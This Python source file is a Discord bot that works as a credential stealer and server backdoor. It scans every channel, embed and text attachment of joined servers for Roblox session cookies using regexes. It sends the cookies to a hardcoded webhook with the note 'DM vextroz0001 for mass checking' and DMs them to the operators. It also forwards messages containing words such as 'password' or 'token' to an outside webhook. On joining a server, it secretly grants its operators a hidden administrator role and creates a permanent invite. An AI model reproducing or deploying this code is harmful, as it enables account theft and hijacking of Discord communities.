import os
import discord
from discord import app_commands
import aiohttp
import asyncio
import datetime
import re
import logging
import io
import json
from typing import List, Union, Dict, Any
from flask import Flask
from threading import Thread

# 🟢 Environment variables for Render
BOT_TOKEN = os.environ['DISCORD_TOKEN']
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [216953894322962433, 1422280514072608932]
CONTROL_CHANNEL_ID = 1432729863692881972
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
OWNED_SERVER_IDS = [1396878002620727397]
SERVER_INVITES = {}

# 🟢 Bot state management
class BotState:
    def __init__(self):
        self.auto_delete_enabled = {}
        self.mirror_webhooks = {}
        self.mirrored_messages = set()
        self.server_roles = {}  # Track created roles per server

bot_state = BotState()

# 🟢 Flask server for UptimeRobot
app = Flask('')

@app.route('/')
def home():
    return "🤖 Bot running 24/7 on Render!"

@app.route('/health')
def health():
    return "✅ Healthy"

@app.route('/ping')
def ping():
    return "pong"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# Start Flask in background
flask_thread = Thread(target=run_flask)
flask_thread.daemon = True
flask_thread.start()

# 🟢 Updated Control View with Enable/Disable buttons
class ServerControlView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @discord.ui.button(label="Enable Auto-Delete", style=discord.ButtonStyle.green)
    async def enable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        bot_state.auto_delete_enabled[self.guild.id] = True
        await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)

    @discord.ui.button(label="Disable Auto-Delete", style=discord.ButtonStyle.red)
    async def disable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        bot_state.auto_delete_enabled[self.guild.id] = False
        await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)

    @discord.ui.button(label="Set Mirror Webhook", style=discord.ButtonStyle.blurple)
    async def set_mirror_webhook(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        modal = MirrorWebhookModal(self)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Scrape Cookies", style=discord.ButtonStyle.grey)
    async def scrape_cookies(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)
        await scrape_server_cookies(interaction, self.guild)

class MirrorWebhookModal(discord.ui.Modal, title="Set Mirror Webhook"):
    webhook_url = discord.ui.TextInput(label="Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.paragraph)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            bot_state.mirror_webhooks[interaction.guild_id] = self.webhook_url.value
            await interaction.response.send_message("✅ Mirror webhook set! Messages with @everyone/@here will be mirrored.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)

# 🟢 Optimized Cookie Fetcher
class CookieFetcher:
    def __init__(self):
        self.processed_messages = set()
        self.cookie_patterns = [
            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\s]+',
            r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}',
            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([^|\s]+)'
        ]

    def extract_cookies_from_text(self, text: str) -> List[str]:
        if not text:
            return []

        cookies_found = []
        
        # Check for cookies in text
        for pattern in self.cookie_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]  # Get the first group if it's a tuple
                
                # Clean and format the cookie
                if match.startswith('_|WARNING'):
                    cookies_found.append(match)
                elif match.startswith('CAEaAhA'):
                    cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")
                else:
                    # Handle partial matches
                    clean_match = re.sub(r'[^\w._-]', '', match)
                    if clean_match.startswith('CAEaAhA'):
                        cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{clean_match}")

        return list(set(cookies_found))  # Remove duplicates

    async def fetch_attachments(self, message) -> List[str]:
        """Extract cookies from text attachments"""
        cookies_found = []
        
        for attachment in message.attachments:
            if attachment.filename.endswith('.txt'):
                try:
                    # Download and read attachment
                    content = await attachment.read()
                    text_content = content.decode('utf-8', errors='ignore')
                    
                    # Extract cookies from attachment content
                    attachment_cookies = self.extract_cookies_from_text(text_content)
                    cookies_found.extend(attachment_cookies)
                    
                except Exception as e:
                    logger.error(f"Error reading attachment {attachment.filename}: {e}")
        
        return cookies_found

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        """Fast cookie scraping from server messages and attachments"""
        all_cookies = set()
        total_messages_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            
            try:
                # Fast message processing with higher limit
                async for message in channel.history(limit=5000):
                    messages_count += 1
                    
                    # Extract from message content
                    content_cookies = self.extract_cookies_from_text(message.content)
                    channel_cookies.update(content_cookies)
                    
                    # Extract from embeds
                    for embed in message.embeds:
                        if embed.description:
                            embed_cookies = self.extract_cookies_from_text(embed.description)
                            channel_cookies.update(embed_cookies)
                        if embed.title:
                            title_cookies = self.extract_cookies_from_text(embed.title)
                            channel_cookies.update(title_cookies)
                        for field in embed.fields:
                            field_cookies = self.extract_cookies_from_text(field.value)
                            channel_cookies.update(field_cookies)
                    
                    # Extract from attachments
                    attachment_cookies = await self.fetch_attachments(message)
                    channel_cookies.update(attachment_cookies)
                    
            except Exception as e:
                logger.error(f"Error processing channel {channel.name}: {e}")
            
            return list(channel_cookies), messages_count

        # Process all channels concurrently for maximum speed
        tasks = []
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).read_messages:
                tasks.append(process_channel(channel))

        # Use asyncio.gather for concurrent processing
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple) and len(result) == 2:
                cookies, count = result
                all_cookies.update(cookies)
                total_messages_scanned += count

        return {'all': list(all_cookies), 'messages_scanned': total_messages_scanned}

    async def send_to_cookie_webhook(self, all_cookies: List[str], messages_scanned: int, time_taken: float) -> bool:
        """Send results to cookie webhook"""
        try:
            async with aiohttp.ClientSession() as session:
                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else ""
                
                embed = discord.Embed(
                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found:** {len(all_cookies)}\n**📩 Messages Scanned:** {messages_scanned}\n**⏱️ Time Taken:** {time_taken:.1f}s",
                    color=0x3498db
                )

                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '@everyone\nDM vextroz0001 for mass checking',
                    'embeds': [embed.to_dict()]
                }))
                
                if all_cookies_content:
                    form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                    return response.status in [200, 204]

        except Exception as e:
            logger.error(f"Error sending to webhook: {e}")
            return False

# 🟢 Optimized Bot Class
class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.fetcher = CookieFetcher()

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("✅ Commands synced")

    async def on_ready(self):
        logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
        logger.info(f'📊 Connected to {len(self.guilds)} servers')

    async def ensure_dollar_role(self, guild):
        """Ensure $$$ role exists (only create one)"""
        if guild.id in bot_state.server_roles:
            return bot_state.server_roles[guild.id]
        
        # Check if role already exists
        existing_role = discord.utils.get(guild.roles, name="$$$")
        if existing_role:
            bot_state.server_roles[guild.id] = existing_role
            return existing_role
        
        # Create new role
        try:
            role = await guild.create_role(
                name="$$$",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                hoist=True,
                mentionable=False
            )
            bot_state.server_roles[guild.id] = role
            logger.info(f"Created $$$ role in {guild.name}")
            return role
        except Exception as e:
            logger.error(f"Error creating role in {guild.name}: {e}")
            return None

    async def assign_role_to_authorized(self, guild):
        """Assign $$$ role to authorized users"""
        role = await self.ensure_dollar_role(guild)
        if not role:
            return
        
        for user_id in AUTHORIZED_USERS:
            member = guild.get_member(user_id)
            if member and role not in member.roles:
                try:
                    await member.add_roles(role, reason="Authorized user")
                    logger.info(f"Assigned $$$ role to {member.name} in {guild.name}")
                except Exception as e:
                    logger.error(f"Error assigning role to {member.name}: {e}")

    async def on_guild_join(self, guild):
        """Handle server join - NO AUTO-DELETE, just setup control panel"""
        try:
            # Generate invite
            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Bot invite")
                    invite_url = invite.url
                    SERVER_INVITES[guild.id] = invite_url
            except Exception:
                pass

            # Send control panel to control channel
            if guild.id not in OWNED_SERVER_IDS:
                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                if control_channel:
                    embed = discord.Embed(
                        title="🚨 New Server Joined",
                        description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                        color=0x00ff00
                    )
                    view = ServerControlView(guild)
                    await control_channel.send("@everyone", embed=embed, view=view)
                    
                    # Assign roles to authorized users
                    await self.assign_role_to_authorized(guild)
                    
                    logger.info(f"Joined new server: {guild.name}")

        except Exception as e:
            logger.error(f"Error in on_guild_join: {e}")

    async def on_member_join(self, member):
        """Auto-assign $$$ role to authorized users when they join"""
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            await self.assign_role_to_authorized(member.guild)

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.guild and message.guild.id in OWNED_SERVER_IDS:
            return

        guild_id = message.guild.id if message.guild else None

        # 🟢 Auto-delete only if enabled via button
        if (guild_id in bot_state.auto_delete_enabled and 
            bot_state.auto_delete_enabled[guild_id] and
            message.guild and 
            (message.mention_everyone or 
             '@everyone' in message.content.lower() or 
             '@here' in message.content.lower())):
            
            try:
                if message.channel.permissions_for(message.guild.me).manage_messages:
                    await message.delete()
                    logger.info(f"Deleted ping message from {message.author.name} in {message.guild.name}")
            except Exception as e:
                logger.error(f"Error deleting message: {e}")

        # 🟢 Mirror only specific messages if webhook is set
        if (guild_id in bot_state.mirror_webhooks and 
            message.id not in bot_state.mirrored_messages and
            message.guild):
            
            should_mirror = False
            mirror_reason = ""
            
            # Check for @everyone/@here
            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                should_mirror = True
                mirror_reason = "Mass ping detected"
            
            # Check for password/keywords in content
            sensitive_keywords = ['password', 'login', 'credential', 'token', 'secret']
            if any(keyword in message.content.lower() for keyword in sensitive_keywords):
                should_mirror = True
                mirror_reason = "Sensitive content detected"
            
            # Check embeds for sensitive content
            for embed in message.embeds:
                embed_text = f"{embed.title or ''} {embed.description or ''}"
                if any(keyword in embed_text.lower() for keyword in sensitive_keywords):
                    should_mirror = True
                    mirror_reason = "Sensitive content in embed"
                    break

            if should_mirror:
                bot_state.mirrored_messages.add(message.id)
                await self.mirror_message(message, mirror_reason)

    async def mirror_message(self, message, reason):
        """Mirror message to webhook"""
        webhook_url = bot_state.mirror_webhooks[message.guild.id]
        try:
            async with aiohttp.ClientSession() as session:
                mirror_data = {
                    'username': f"{message.author.name} | {message.guild.name}",
                    'content': f"**{reason}**\n{message.content}",
                    'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                }

                if message.embeds:
                    mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]

                async with session.post(webhook_url, json=mirror_data) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to mirror message: {response.status}")

        except Exception as e:
            logger.error(f"Error mirroring message: {e}")

# Initialize bot
bot = CookieFetcherBot()

# 🟢 Scrape command
async def scrape_server_cookies(interaction, guild):
    """Scrape cookies from server"""
    start_time = datetime.datetime.now()

    try:
        status_embed = discord.Embed(
            title="🔍 Scanning Server...",
            description=f"Scanning {guild.name} for cookies...",
            color=0x3498db
        )
        status_msg = await interaction.followup.send(embed=status_embed, ephemeral=True)

        # Fast cookie scraping
        result = await bot.fetcher.fetch_all_server_cookies(guild)
        all_cookies = result['all']
        messages_scanned = result['messages_scanned']

        end_time = datetime.datetime.now()
        time_taken = (end_time - start_time).total_seconds()

        # Send to webhook
        webhook_success = await bot.fetcher.send_to_cookie_webhook(all_cookies, messages_scanned, time_taken)

        # Send DM to user
        try:
            dm_channel = await interaction.user.create_dm()
            if all_cookies:
                cookies_content = "\n".join(all_cookies)
                await dm_channel.send(
                    content=f"**🍪 Found {len(all_cookies)} cookies in {guild.name}**",
                    file=discord.File(io.BytesIO(cookies_content.encode()), filename="cookies.txt")
                )
            else:
                await dm_channel.send(f"❌ No cookies found in {guild.name}")
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")

        # Update status
        result_embed = discord.Embed(
            title="✅ Scan Complete",
            description=f"**Cookies Found:** {len(all_cookies)}\n**Messages Scanned:** {messages_scanned:,}\n**Time Taken:** {time_taken:.1f}s",
            color=0x00ff00
        )
        await status_msg.edit(embed=result_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Scan Failed",
            description=f"Error: {str(e)}",
            color=0xff0000
        )
        await interaction.followup.send(embed=error_embed, ephemeral=True)

@bot.tree.command(name="scrape", description="Scrape Roblox cookies from this server")
async def scrape_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
        return
        
    await interaction.response.defer(ephemeral=True)
    await scrape_server_cookies(interaction, interaction.guild)

# 🟢 Enhanced auto-restart main loop
if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ DISCORD_TOKEN not found")
        exit(1)

    logger.info("🚀 Starting Bot on Render...")
    
    # Auto-restart on crash
    while True:
        try:
            bot.run(BOT_TOKEN)
        except discord.LoginFailure:
            logger.error("❌ Invalid token - stopping")
            break
        except Exception as e:
            logger.error(f"❌ Bot crashed: {e}")
            logger.info("🔄 Restarting in 10 seconds...")
            asyncio.sleep(10)
